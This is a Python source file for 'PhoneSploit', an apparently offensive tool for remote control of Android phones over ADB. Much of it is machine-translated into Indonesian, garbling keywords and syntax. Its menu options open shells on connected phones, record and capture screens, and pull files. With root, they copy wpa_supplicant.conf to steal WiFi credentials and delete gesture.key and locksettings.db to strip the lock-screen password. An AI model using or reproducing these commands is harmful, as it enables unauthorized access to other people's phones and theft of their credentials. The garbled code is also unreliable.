# - * - coding: utf-8 - * -

#Dikode oleh Hackday
# Nikmati


# =============================
#Import
impor os
impor sys
impor acak
waktu impor sebagai t
dari colorama import Fore, init

memuat ulang (sys)
sys.setdefaultencoding ("utf-8")

# =============================
# Variabel
CurrentDir = os.path.dirname (os.path.abspath (__ file__))
load_count = 0

# =============================
#Instal Fungsi
# def ColoringModeStartup ():
# coloring_file = terbuka (CurrentDir + "\\ install \\ coloring.txt", "a +")
# line = open (CurrentDir + "\\ install \\ coloring.txt", "a +"). readline ()
# if 'init' pada baris:
# init (convert = True)
# main ()
# if 'false' dalam baris:
# main ()
# jika "NOT_LOADED" sejalan:
# platform_choice = raw_input ("Apakah Anda memuat skrip ini di indows (W) atau (L) inux:")
# open (CurrentDir + "\\ install \\ coloring.txt", "w"). close ()
# if platform_choice.lower () == 'w':
# coloring_file.write ("init")
# lain:
# coloring_file.write ("false")
# yn = raw_input (Fore.WHITE + "Sudahkah Anda menginstal adb melalui baris perintah" + Fore.GREEN + "Y" + Fore.WHITE + "/" + Fore.RED + "N" + Fore.WHITE)
# if yn == "n":
# os.system ("sudo apt install adb")
# lain:
# main ()

# =============================
# Graphics # http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20

panah = Fore.RED + "└──>". decode ("utf-8"). strip () + Fore.WHITE
panah = str (panah)
connect = Fore.RED + "│" .decode ("utf-8"). strip () + Fore.WHITE

logo_design_1 = ('' '
  {0} ____ __ _____ __ _ __ 
   / __ \ / / _ ____ ____ ___ / ___ / ____ / / ___ (_) / _
  / / _ / / __ \ / __ \ / __ \ / _ \\ __ \ / __ \ / / __ \ / / __ /
{1} / ____ / / / / _ / / / / / __ / __ / / / _ / / / / _ / / / /  
/ _ / / _ / / _ / \ ____ / _ / / _ / \ ___ / ____ / .___ / _ / \ ____ / _ / \ __ /  
                                 /_/''').format(Fore.GREEN, Fore.WHITE, Fore.RED)

logo_design_2 = Fore.GREEN + '' '                                             
  .; ' `;,
 .; ' ,; ' `;,`;, {0} PhoneSploit
.; ' ,; ' ,; ' `;,`;, `;,
:: ::: {1} () {0}: :: :: {1} Kode oleh Blank / sixtysix-Team {0}
':. ':. ':. {1} / _ \ {0},: ',:',: '
 ':. ':. {1} / ___ \ {0},: ',:'   
  ':. {1} / _____ \ {0},: '
           {1} / \\ {0}
'' '.format (Fore.GREEN, Fore.WHITE, Fore.RED)

logo_design_pre = '' '
{0} ╔═╗ {1} ┬ ┬┌─┐┌┐┌┌─┐ {0} ╔═╗ {1} ┌─┐┬ ┌─┐┬┌┬┐
{0} ╠═╝ {1} ├─┤│ ││││├┤ {0} ╚═╗ {1} ├─┘│ │ ││ │ 
{0} ╩ {1} ┴ ┴└─┘┘└┘└─┘ {0} ╚═╝ {1} ┴ ┴─┘└─┘┴ ┴ '' '.format (Fore.GREEN, Fore.WHITE, Fore.RED)
logo_design_3 = logo_design_pre.decode ("utf-8")

logo_design_4 = '' '
\ 033 [92m
          + hydNNNNdyh +
        + mMMMMMMMMMMMMm +
      `dMMm \ 033 [0m: \ 033 [92mNMMMMMMN \ 033 [0m: \ 033 [92mmMMd`
      hMMMMMMMMMMMMMMMMh
  \ 033 [92m .. yyyyyyyyyyyyyyyyyyyyy .. \ 033 [0m waktu Expoit :) \ 033 [92m
\ 033 [92m.mMMm`MMMMMMMMMMMMMMMMMM`mMMm. \ 033 [0m Terima kasih telah mengunduh! \ 033 [92m
\ 033 [92m: MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
: MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
: MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
: MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 + yy + MMMMMMMMMMMMMMMMMMMM + yy +
      mMMMMMMMMMMMMMMMMm
      `/ ++ MMMMh ++ hMMMM ++ /`
          MMMMo oMMMM
          MMMMo oMMMM
          oNMm- -mMNs '' '

halaman_1 = '' '\ n
{0} [{1} 1 {0}] {2} Tampilkan Perangkat yang Terhubung {0} [{1} 6 {0}] {2} Layar rekam ponsel {0} [{1} 11 {0}] { 2 ► Copot aplikasi                   
{0} [{1} 2 {0}] {2} Putuskan sambungan semua perangkat {0} [{1} 7 {0}] {2} Layar Potret gambar di telepon {0} [{1} 12 {0 }] {2} Tampilkan log waktu nyata perangkat       
{0} [{1} 3 {0}] {2} Hubungkan telepon baru {0} [{1} 8 {0}] {2} Restart Server {0} [{1} 13 {0}] {2 } Info Sistem Dump                   
{0} [{1} 4 {0}] {2} Shell Akses pada telepon {0} [{1} 9 {0}] {2} Tarik folder dari ponsel ke pc {0} [{1} 14 { 0}] {2} Daftar semua aplikasi di telepon           
{0} [{1} 5 {0}] {2} Instal apk di ponsel {0} [{1} 10 {0}] {2} Matikan Perangkat {0} [{1} 15 {0 }] {2} Jalankan aplikasi                         


{0} [{1} 99 {0}] {2} Keluar {0} [{1} 0 {0}] {2} Hapus {0} [{1} p {0}] Halaman Selanjutnya v1.2
'' '.format (Fore.CYAN, Fore.RED, Fore.GREEN)

page_2 = '' '\ n
{0} [{1} 16 {0}] {2} Port Forwarding {0} [{1} 21 {0}] {2} NetStat 
{0} [{1} 17 {0}] {2} Grab wpa_supplicant {0} [{1} 22 {0}] {2} Hidupkan / Matikan WiFi                 
{0} [{1} 18 {0}] {2} Tampilkan Mac / Inet {0} [{1} 23 {0}] {2} Hapus Kata Sandi
{0} [{1} 19 {0}] {2} Ekstrak apk dari aplikasi {0} [{1} 24 {0}] {2} Gunakan Keycode            
{0} [{1} 20 {0}] {2} Dapatkan Status Baterai {0} [{1} 25 {0}] {2} Dapatkan Aktivitas Saat Ini                  


{0} [{1} 99 {0}] {2} Keluar {0} [{1} 0 {0}] {2} Hapus {0} [{1} b {0}] Kembali ke halaman satu
'' '.format (Fore.CYAN, Fore.RED, Fore.GREEN)


# =============================
#Utama
def main ():
    page_num = 1
    option = raw_input (Fore.WHITE + "Phonesploit" + Fore.RED + "(main_menu)" + Fore.WHITE + ">")
    jika opsi == '1':
        os.system ("adb devices -l")
    opsi elif == '2':
        os.system ("adb disconnect")
    opsi elif == '3':
        os.system ("adb tcpip 5555")
        print ((\ \ [{0} + {1}] masukkan alamat ip ponsel. "). format (Fore.RED, Fore.WHITE))
        ip = raw_input (panah + "Phonesploit" + Fore.RED + "(connect_phone)" + Fore.WHITE + ">")
        os.system ("adb connect" + ip + ": 5555")
    
    opsi elif == '4':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "Phonesploit" + Fore.RED + "(shell_on_phone)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "shell")

    opsi elif == '5':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(apk_install)" + Fore.WHITE + ">")
        cetak ("" + hubungkan))
        print (("[{0} + {1}] Masukkan format apk."). (Fore.RED, Fore.WHITE))
        apk_location = raw_input ("" panah + "ponselploit" + Fore.RED + "(apk_install)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "install" + apk_location)
        print (Fore.GREEN + "Apk telah diinstal.")

    opsi elif == '6':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(screen_record)" + Fore.WHITE + ">")
        cetak ("" + hubungkan))
        print (("[{0} + {1}] Harap tunggu 3m rekamannya"). format (Fore.RED, Fore.WHITE))
        cetak ("" + hubungkan))
        os.system ("adb -s" + device_name + "shell screenrecord /sdcard/demo.mp4")
        cetak ("[{0} + {1}] Masukkan di mana Anda ingin video disimpan."). format (Fore.RED, Fore.WHITE))
        place_location = raw_input ("" panah + "ponselploit" + Fore.RED + "(screen_record)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "pull /sdcard/demo.mp4" + place_location)

    opsi elif == '7':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "ponselploit" + Fore.RED + "(tangkapan layar)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "shell screencap /sdcard/screen.png")
        cetak ("" + hubungkan))
        print (("[{0} + {1}] Masukkan di mana Anda ingin tangkapan layar disimpan."). format (Fore.RED, Fore.WHITE))
        place_location = raw_input ("" + panah + "Phonesploit" + Fore.RED + "(tangkapan layar)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "pull /sdcard/screen.png" + place_location)

    opsi elif == '8':
        os.system ("adb kill-server && adb start-server")
    
    opsi elif == '9':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(file_pull)" + Fore.WHITE + ">")
        cetak ("" + hubungkan))
        print (("[{0} + {1}] Masukkan lokasi file di perangkat"). format (Fore.RED, Fore.WHITE))
        file_location = raw_input ("" panah + "ponselploit" + Fore.RED + "(file_pull)" + Fore.WHITE + ">")
        cetak ("" + hubungkan))
        print (([[0 0} + {1}] Masukkan di mana Anda ingin file disimpan. "). format (Fore.RED, Fore.WHITE))
        place_location = raw_input ("" + panah + "Phonesploit" + Fore.RED + "(file_pull)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "pull" + file_location + "" + place_location)

    opsi elif == '10':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(device_reboot)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "reboot")
    
    opsi elif == '11':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(app_delete)" + Fore.WHITE + ">")
        cetak ("" + hubungkan))
        print (("[{0} + {1}] Masukkan nama paket."). format (Fore.RED, Fore.WHITE))
        package_name = raw_input ("" + panah + "ponselploit" + Fore.RED + "(app_delete)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "unistall" + package_name)

    opsi elif == '12':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(log)" + Fore.WHITE + ">")
        os.system ('adb -s' + device_name + "logcat")

    opsi elif == '13':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "Phonesploit" + Fore.RED + "(sys_info)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "dumpsys")        

    opsi elif == '14':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(package_manager)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "paket daftar shell pm -f")
        utama()

    opsi elif == '15':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(app_run)" + Fore.WHITE + ">")
        cetak ("" + hubungkan))
        print (("[{0} + {1}] Masukkan nama paket. Mereka terlihat seperti ini -> format com.snapchat.android") (Fore.RED, Fore.WHITE))
        package_name = raw_input ("" + panah + "ponselploit" + Fore.RED + "(app_run)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "shell monkey -p" + package_name + "-v 500")
        utama()      

    opsi elif == '16':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(port_forward)" + Fore.WHITE + ">")
        cetak ("" + hubungkan))
        print (("[{0} + {1}] Masukkan port pada perangkat."). format (Fore.RED, Fore.WHITE))
        port_device = raw_input ("" panah + "ponselploit" + Fore.RED + "(port_forward)" + Fore.WHITE + ">")
        cetak ("" + hubungkan))
        print (("[{0} + {1}] Masukkan port untuk meneruskannya juga."). format (Fore.RED, Fore.WHITE))
        forward_port = raw_input ("" + panah + "teleponploit" + Fore.RED + "(port_forward)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "forward tcp:" + port_device + "tcp:" + forward_port) 

    opsi elif == '17':
        mencoba:
            print (("[{0} + {1}] Masukkan nama perangkat."). format (Fore.RED, Fore.WHITE))
            device_name = raw_input (panah + "Phonesploit" + Fore.RED + "(wpa_grab)" + Fore.WHITE + ">")
            print ((Fore.WHITE + "[{0} + {1}] {1} PERANGKAT MEMBUTUHKAN ROOT UNTUK LANJUTKAN UNTUK MENGELUARKAN KELUAR MENGGUNAKAN CTRL + C"). format (Fore.RED, Fore.WHITE))
            cetak ("" + hubungkan))
            print (("[{0} + {1}] Masukkan di mana Anda ingin file disimpan."). format (Fore.RED, Fore.WHITE))
            location = raw_input ("" + panah + "Phonesploit" + Fore.RED + "(wpa_grab)" + Fore.WHITE + ">")      
            os.system ("adb -s" + device_name + "shell" + "su -c 'cp /data/misc/wifi/wpa_supplicant.conf / sdcard /'")
            os.system ("adb -s" + device_name + "pull /sdcard/wpa_supplicant.conf" + location)
        kecuali KeyboardInterrupt:
            utama()    

    opsi elif == '18':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(mac_inet)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "shell ip address show wlan0")
        utama()

    opsi elif == '19':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(pull_apk)" + Fore.WHITE + ">")
        cetak ("" + hubungkan))
        print (("[{0} + {1}] Masukkan nama paket. Mereka terlihat seperti ini -> format com.snapchat.android") (Fore.RED, Fore.WHITE))
        package_name = raw_input ("" + panah + "Phonesploit" + Fore.RED + "(pull_apk)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "shell pm path" + package_name)
        cetak ("" + hubungkan))
        print ("[{0} + {1}] Masukkan Path. lihat seperti ini /data/app/com.snapchat.android-qWgDcBiCEvANq6op_NPqeA==/base.apk").format(Fore.RED, Fore.WHITE ))
        path = raw_input ("" + panah + "Phonesploit" + Fore.RED + "(pull_apk)" + Fore.WHITE + ">")
        cetak ("" + hubungkan))
        print (("[{0} + {1}] Masukkan lokasi untuk menyimpan apk:") .format (Fore.RED, Fore.WHITE))
        location = raw_input ("" + panah + "Phonesploit" + Fore.RED + "(pull_apk)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "pull" + path + "" + location)
        utama()

    opsi elif == '20':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "teleponploit" + Fore.RED + "(baterai)" + Fore.WHITE + ">")
        os.system ("adb -s" + device_name + "shell dumpsys battery")
        utama()

    opsi elif == '21':
        print ((\ \ [{0} + {1}] Masukkan nama perangkat. "). format (Fore.RED, Fore.WHITE))
        device_name = raw_input (panah + "phoneploit" + Fore.RED + "(net_stat)" + Fore.WHITE + ">")
        os.system("adb -s " +device_name+ " shell netstat")
        main()

    elif option == '22':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(wifi) "+Fore.WHITE + "> ")
        print (("     "+connect))
        print (("    [{0}+{1}] To turn wifi back on you need the device to be pluged in.").format(Fore.RED, Fore.WHITE))
        print (("     "+connect))
        on_off = raw_input(Fore.WHITE + "    ["+Fore.RED+"+"+Fore.WHITE+"]Would you like the wifi "+Fore.GREEN +"on"+Fore.WHITE +"/"+Fore.RED +"off "+Fore.WHITE)
        if on_off == 'off':
            command = " shell svc wifi disable"
        else:
            command = " shell svc wifi enable"
            
        os.system("adb -s "+device_name+command)

    elif option == '23':
        print (("[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(pass_remove) "+Fore.WHITE + "> ")
        print ((Fore.WHITE + "    [{0}+{1}]{1}THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C THIS IS ALSO UNTESTED").format(Fore.RED, Fore.WHITE))
        print (("     "+connect))
        print (Fore.RED + "******************TRYING TO REMOVE PASS******************")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'") 
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'") 
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
        print (Fore.RED + "******************TRYING TO REMOVE PASS******************")  
        
    elif option == '24':
        print (("[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(keycode) "+Fore.WHITE + "> ")
        print ('''
0 -->  "KEYCODE_UNKNOWN" 
1 -->  "KEYCODE_MENU" 
2 -->  "KEYCODE_SOFT_RIGHT" 
3 -->  "KEYCODE_HOME" 
4 -->  "KEYCODE_BACK" 
5 -->  "KEYCODE_CALL" 
6 -->  "KEYCODE_ENDCALL" 
7 -->  "KEYCODE_0" 
8 -->  "KEYCODE_1" 
9 -->  "KEYCODE_2" 
10 -->  "KEYCODE_3" 
11 -->  "KEYCODE_4" 
12 -->  "KEYCODE_5" 
13 -->  "KEYCODE_6" 
14 -->  "KEYCODE_7" 
15 -->  "KEYCODE_8" 
16 -->  "KEYCODE_9" 
17 -->  "KEYCODE_STAR" 
18 -->  "KEYCODE_POUND" 
19 -->  "KEYCODE_DPAD_UP" 
20 -->  "KEYCODE_DPAD_DOWN" 
21 -->  "KEYCODE_DPAD_LEFT" 
22 -->  "KEYCODE_DPAD_RIGHT" 
23 -->  "KEYCODE_DPAD_CENTER" 
24 -->  "KEYCODE_VOLUME_UP" 
25 -->  "KEYCODE_VOLUME_DOWN" 
26 -->  "KEYCODE_POWER" 
27 -->  "KEYCODE_CAMERA" 
28 -->  "KEYCODE_CLEAR" 
29 -->  "KEYCODE_A" 
30 -->  "KEYCODE_B" 
31 -->  "KEYCODE_C" 
32 -->  "KEYCODE_D" 
33 -->  "KEYCODE_E" 
34 -->  "KEYCODE_F" 
35 -->  "KEYCODE_G" 
36 -->  "KEYCODE_H" 
37 -->  "KEYCODE_I" 
38 -->  "KEYCODE_J" 
39 -->  "KEYCODE_K" 
40 -->  "KEYCODE_L" 
41 -->  "KEYCODE_M" 
42 -->  "KEYCODE_N" 
43 -->  "KEYCODE_O" 
44 -->  "KEYCODE_P" 
45 -->  "KEYCODE_Q" 
46 -->  "KEYCODE_R" 
47 -->  "KEYCODE_S" 
48 -->  "KEYCODE_T" 
49 -->  "KEYCODE_U" 
50 -->  "KEYCODE_V" 
51 -->  "KEYCODE_W" 
52 -->  "KEYCODE_X" 
53 -->  "KEYCODE_Y" 
54 -->  "KEYCODE_Z" 
55 -->  "KEYCODE_COMMA" 
56 -->  "KEYCODE_PERIOD" 
57 -->  "KEYCODE_ALT_LEFT" 
58 -->  "KEYCODE_ALT_RIGHT" 
59 -->  "KEYCODE_SHIFT_LEFT" 
60 -->  "KEYCODE_SHIFT_RIGHT" 
61 -->  "KEYCODE_TAB" 
62 -->  "KEYCODE_SPACE" 
63 -->  "KEYCODE_SYM" 
64 -->  "KEYCODE_EXPLORER" 
65 -->  "KEYCODE_ENVELOPE" 
66 -->  "KEYCODE_ENTER" 
67 -->  "KEYCODE_DEL" 
68 -->  "KEYCODE_GRAVE" 
69 -->  "KEYCODE_MINUS" 
70 -->  "KEYCODE_EQUALS" 
71 -->  "KEYCODE_LEFT_BRACKET" 
72 -->  "KEYCODE_RIGHT_BRACKET" 
73 -->  "KEYCODE_BACKSLASH" 
74 -->  "KEYCODE_SEMICOLON" 
75 -->  "KEYCODE_APOSTROPHE" 
76 -->  "KEYCODE_SLASH" 
77 -->  "KEYCODE_AT" 
78 -->  "KEYCODE_NUM" 
79 -->  "KEYCODE_HEADSETHOOK" 
80 -->  "KEYCODE_FOCUS" 
81 -->  "KEYCODE_PLUS" 
82 -->  "KEYCODE_MENU" 
83 -->  "KEYCODE_NOTIFICATION" 
84 -->  "KEYCODE_SEARCH" 
85 -->  "TAG_LAST_KEYCODE"        
        ''')        
        print (("[{0}+{1}]Enter a number.").format(Fore.RED, Fore.WHITE))
        num = raw_input(arrow + "phonesploit"+Fore.RED + "(keycode) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" shell input keyevent "+num)

    elif option == '25':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(current_activity) "+Fore.WHITE + "> ")
        os.system("adb -s " +device_name+ " dumpsys activity")
        main()
        
    elif option == '0':
        global page2
        if page2 == True:
            clear(page_2)
        else:
            clear(page_1)

    elif option == 'p':
        os.system('clear')
        page2 = True
        banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4])
        print (Fore.RED + banner_title)
        print (page_2)  

    elif option == 'b':
        os.system('clear')
        page2 = False
        banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4])
        print (Fore.RED + banner_title)
        print (page_1)  

    elif option == '99':
        exit()


    main()

#=============================

def clear(page):
    global page2
    os.system('clear')
    banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4])
    print (Fore.RED + banner_title)    
    print (page)



#=============================  
# Run
yn = raw_input(Fore.WHITE + "Have you already installed adb via command line "+Fore.GREEN + "Y"+Fore.WHITE+"/"+Fore.RED+"N "+Fore.WHITE)
if yn == "n":
    os.system("sudo apt install adb")
print (Fore.RED + "Starting  adb server..")
os.system("adb tcpip 5555")
t.sleep(4)
os.system('clear')
banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4])
print (Fore.RED + banner_title)  
print (page_1)
main()
